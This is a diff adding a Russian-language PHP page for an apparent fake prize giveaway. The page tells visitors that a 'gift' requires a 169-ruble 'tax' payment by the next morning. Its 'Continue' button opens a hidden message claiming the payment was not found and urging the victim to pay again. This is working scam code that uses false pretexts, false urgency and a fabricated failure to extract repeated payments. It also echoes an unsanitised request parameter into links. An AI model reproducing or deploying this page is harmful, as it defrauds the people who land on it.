@@ -1,0 +1,244 @@
+<?
+$gid = $_GET["gid"];
+
+
+include("host.php");
+
+$gd = file_get_contents($host."/gd.php?gid=".$gid);
+
+
+ $gd =  str_replace("%i%", "И",  $gd);
+ $gd =  str_replace("%s%", "ш",  $gd);
+$gd = json_decode($gd, true);
+
+
+if($gd["member"]["ava"] == "") {
+	exit;
+}
+
+	$sum = 169;
+
+?>
+
+
+<!DOCTYPE html>
+<html>
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>...</title>
+
+	<!-- Bootstrap -->
+	<link rel="stylesheet" href="assets/vendor/bootstrap/css/bootstrap.min.css" type="text/css">
+
+	<!-- Bootstrap -->
+	<link rel="stylesheet" href="assets/css/bootstrap.min.css" type="text/css">
+
+	<!-- Fonts -->
+	<link href="https://fonts.googleapis.com/css?family=Nunito:400,600,700,800|Roboto:400,500,700" rel="stylesheet"> 
+
+	<!-- Plugins -->
+	<link rel="stylesheet" href="assets/css/swiper.min.css">
+	<link rel="stylesheet" href="assets/css/hamburgers.min.css" type="text/css">
+	<link rel="stylesheet" href="assets/css/animate.min.css" type="text/css">
+	<link rel="stylesheet" href="assets/css/jquery.fancybox.min.css">
+
+	<!-- Icons -->
+	<link rel="stylesheet" href="assets/css/font-awesome.min.css" type="text/css">
+
+	<!-- Global style (main) -->
+	<link id="stylesheet" type="text/css" href="assets/css/boomerang.min.css" rel="stylesheet" media="screen">
+
+	<!-- Custom style - Remove if not necessary -->
+	<link type="text/css" href="assets/css/custom-style.css" rel="stylesheet">
+
+	<!-- Favicon -->
+	<link href="assets/images/favicon.png" rel="icon" type="image/png">
+
+	<link href="https://unpkg.com/ionicons@4.5.5/dist/css/ionicons.min.css" rel="stylesheet">
+
+</head>
+<body>
+<script src="https://yastatic.net/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- MAIN WRAPPER -->
+<div class="body-wrap">
+    <div id="st-container" class="st-container">
+        <div class="st-pusher">
+            <div class="st-content">
+                <div class="st-content-inner">
+                    <!-- Header -->
+					<? include("head.php"); ?>
+						
+<section class="slice sct-color-2" id="to">
+	<div class="container">
+		
+		
+		
+<div class="tabs tabs--style-1 tabs--centered" role="tabpanel">
+    <!-- Nav tabs -->
+   <ul class="nav nav-pills nav-pills--rounded justify-content-center" role="tablist">
+        <li class="nav-item" role="presentation">
+            <a aria-controls="home" role="tab" class="nav-link text-center text-uppercase strong-500">
+                <div class="nav-pill">
+                    <span class="nav-pill-circle">1</span>
+                    <span class="nav-pill-text text-caps strong-500">Данные получателя</span>
+                </div>
+            </a>
+        </li>
+        <li class="nav-item" role="presentation" class="">
+            <a aria-controls="home" role="tab" class="nav-link text-center text-uppercase strong-500">
+                <div class="nav-pill">
+                    <span class="nav-pill-circle">2</span>
+                    <span class="nav-pill-text text-caps strong-500">Договор дарения</span>
+                </div>
+            </a>
+        </li>
+		<li class="nav-item" role="presentation" class="">
+            <a aria-controls="home" role="tab" class="nav-link active text-center text-uppercase strong-500">
+                <div class="nav-pill">
+                    <span class="nav-pill-circle">3</span>
+                    <span class="nav-pill-text text-caps strong-500">Завершение</span>
+                </div>
+            </a>
+        </li>
+    </ul>
+
+    
+</div>
+
+		
+	</div>
+</section>
+
+	
+
+<section class=" sct-color-2 mb-5">
+			<div class="profile">
+				<div class="container">
+					<div class="row slice-sm cols-xs-space cols-sm-space cols-md-space">
+						<div class="offset-2 col-8">
+						
+						<center><h1>Данные успешно сохранены</h1></center><br><br>
+						<p class="text-lg line-height-1_6 text-left" style="font-size: 1.2rem !important;">
+						Доходы, полученные в виде выигрышей в лотерею или подарков, подлежат обложению налогом на доходы физических лиц. Доходы в виде подарков не облагаются налогом на доходы физических лиц в случае, если их стоимость не превышает 4000 рублей.<br><br> 
+
+						Так как стоимость вашего подарка превышает 4000 рублей, для его получения вам необходимо оплатить налог в размере <? echo $sum?> РУБ. 00 КОП.<br> 
+						Оплату необходимо внести до <? echo date('d.m.Y', strtotime("+1 days")); ?>, 09:59 по МСК.
+						<br><br>После оплаты приз высылается в течение дня. Вам будет отправлено СМС-сообщение с трек-номером.<br>
+						Доставка осуществляется транспортной компанией RATEK в течение 4-7 дней. Предварительно с Вами свяжется менеджер для уточнения некоторых деталей.
+						</p>
+						
+						
+						<div class="row align-items-center pt-5">
+								<a href="<? echo $host ?>/donate.php?sum=<? echo $sum?>&gid=<? echo $gid?>"  target="_blank" style="text-transform:none; color:white;" class="btn btn-styled btn-block btn-success">Оплатить (<? echo $sum?> РУБ. 00 КОП.)</a>
+						</div>
+						<div class="row align-items-center mt-3">
+								<button href="javascript:void(0)" data-fancybox data-src="#fancybox_hidden_prod" style="text-transform:none;" class="btn btn-styled btn-block btn-success">Продолжить</button>
+						</div>
+						
+						</div>
+					</div>
+					
+				</div>
+			</div>
+		</section>
+	</div>
+</div>
+<div style="display:none;" id="fancybox_hidden_prod">
+                    				
+					<center>Платеж не найден.<br>
+					К сожалению, нам не удалось найти Ваш платеж. Убедитесь в том, что Вы верно указали ФИО при оплате (прим. Иванов Иван Иванович).<br> Неподтвержденные операции считаются недействительными. Возврат средств при неверном вводе данных осуществляется в течение <strong>12</strong> часов с момента оплаты.
+					Пожалуйста, повторите оплату.
+					<br>
+					<br>
+					<a href="<? echo $host ?>/donate.php?try=1&sum=<? echo $sum?>&gid=<? echo $gid?>" target="_blank" style="text-transform:none; color:white;" class="btn btn-styled btn-success">Попробовать снова</a>
+						
+					</center>
+					
+</div>
+	
+	<footer id="footer" class="footer">
+    <div class="footer-bottom py-3">
+        <div class="container">
+            <div class="row cols-xs-space col-sm-space align-items-center">
+                <div class="col-md-7 col-12">
+                    <div class="text-xs-center text-sm-left">
+                        <ul class="footer-menu">
+                            <li>
+                                <a target="_blank" href="" style="padding-left: 0;">НАША ГРУППА</a>
+                            </li>
+                            
+                        </ul>
+
+                        <div class="copyright mt-1">
+                            <ul class="copy-links">
+                                <li>
+                                    © 2018                                 </li>
+                                
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+			</div>
+        </div>
+    </div>
+</footer>
+	
+	
+                </div>
+            </div>
+        </div><!-- END: st-pusher -->
+    </div><!-- END: st-container -->
+</div><!-- END: body-wrap -->
+
+<!-- Core -->
+
+<script src="assets/js/popper.min.js"></script>
+<script src="assets/js/bootstrap.min.js"></script>
+<script src="assets/js/slidebar/slidebar.js"></script>
+<script src="assets/js/classie.js"></script>
+
+<!-- Bootstrap Extensions -->
+<script src="assets/js/bootstrap-growl.min.js"></script>
+<script src="assets/js/scrollpos-styler.js"></script>
+
+<!-- Plugins: Sorted A-Z -->
+<script src="assets/js/adaptive-backgrounds.js"></script>
+<script src="assets/js/jquery.countdown.min.js"></script>
+<script src="assets/js/dropzone.min.js"></script>
+<script src="assets/js/jquery.easypiechart.min.js"></script>
+<script src="assets/js/jquery.fancybox.min.js"></script>
+<script src="assets/js/flatpickr.min.js"></script>
+<script src="assets/js/flip.min.js"></script>
+<script src="assets/js/footer-reveal.min.js"></script>
+<script src="assets/js/jquery.gradientify.min.js"></script>
+<script src="assets/js/headroom.min.js"></script>
+<script src="assets/js/jquery.headroom.min.js"></script>
+<script src="assets/js/input-mask.min.js"></script>
+<script src="assets/js/instafeed.js"></script>
+<script src="assets/js/jquery.countTo.js"></script>
+<script src="assets/js/nouislider.min.js"></script>
+<script src="assets/js/paraxify.min.js"></script>
+<script src="assets/js/select2.min.js"></script>
+<script src="assets/js/sticky-kit.min.js"></script>
+<script src="assets/js/swiper.min.js"></script>
+<script src="assets/js/autosize.min.js"></script>
+<script src="assets/js/typeahead.bundle.min.js"></script>
+<script src="assets/js/typed.min.js"></script>
+<script src="assets/js/vide.min.js"></script>
+<script src="assets/js/viewportchecker.min.js"></script>
+<script src="assets/js/wow.min.js"></script>
+
+<!-- Isotope -->
+<script src="assets/js/isotope.min.js"></script>
+<script src="assets/js/imagesloaded.pkgd.min.js"></script>
+
+
+<!-- App JS -->
+<script src="assets/js/boomerang.min.js"></script>
+
+</body>
+</html>
